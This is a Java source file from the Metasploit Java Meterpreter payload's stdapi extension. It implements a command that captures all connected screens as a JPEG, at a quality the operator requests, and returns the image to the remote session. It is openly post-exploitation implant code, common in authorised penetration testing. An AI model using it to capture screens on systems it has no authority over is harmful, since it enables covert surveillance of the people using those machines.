package com.metasploit.meterpreter.stdapi;

import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.io.ByteArrayOutputStream;

import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

public class stdapi_ui_desktop_screenshot_V1_4 extends stdapi_ui_desktop_screenshot implements Command {

	public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
		int quality = request.getIntValue(TLVType.TLV_TYPE_DESKTOP_SCREENSHOT_QUALITY);
		response.add(TLVType.TLV_TYPE_DESKTOP_SCREENSHOT, grabScreen(quality));
		return ERROR_SUCCESS;
	}

	private byte[] grabScreen(int quality) throws Exception {
		Rectangle screenBounds = new Rectangle();
		GraphicsDevice[] devices = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
		for (int i = 0; i < devices.length; i++) {
			screenBounds = screenBounds.union(devices[i].getDefaultConfiguration().getBounds());
		}
		ImageWriter writer = (ImageWriter) ImageIO.getImageWritersByFormatName("jpeg").next();
		ImageWriteParam iwp = writer.getDefaultWriteParam();
		if (quality >= 0 && quality <= 100) {
			iwp.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
			iwp.setCompressionQuality(quality / 100.0f);
		}
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		writer.setOutput(ImageIO.createImageOutputStream(baos));
		writer.write(null, new IIOImage(new Robot().createScreenCapture(screenBounds), null, null), iwp);
		writer.dispose();
		return baos.toByteArray();
	}
}
